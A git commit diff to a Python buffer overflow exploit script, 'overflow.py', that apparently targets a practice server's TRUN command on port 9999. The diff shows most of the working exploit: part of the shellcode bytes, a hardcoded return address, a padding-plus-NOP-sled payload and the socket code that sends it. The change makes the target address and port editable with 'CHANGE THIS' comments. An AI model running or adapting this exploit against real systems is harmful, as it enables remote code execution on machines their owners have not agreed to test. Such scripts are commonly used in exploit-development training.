4e34c544ae5a443ebf9594bfdbb0030ebc538c72
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-05-09 20:03:40 +0100

    Update overflow.py

--- OverFlow/overflow.py
+++ OverFlow/overflow.py
@@ -28,12 +28,14 @@ overflow = (
 "\x85\xbf\x4b\xae\xa6\x95")
 
 returnaddress = "\xaf\x11\x50\x62"
+address = '127.0.0.1' #CHANGE THIS
+port = 9999 #CHANGE THIS
 
 shellcode = "A" * 2003 + returnaddress + "\x90" * 32 + overflow
 
 try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('192.168.10.162',9999))
+	s.connect((address,port))
 
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
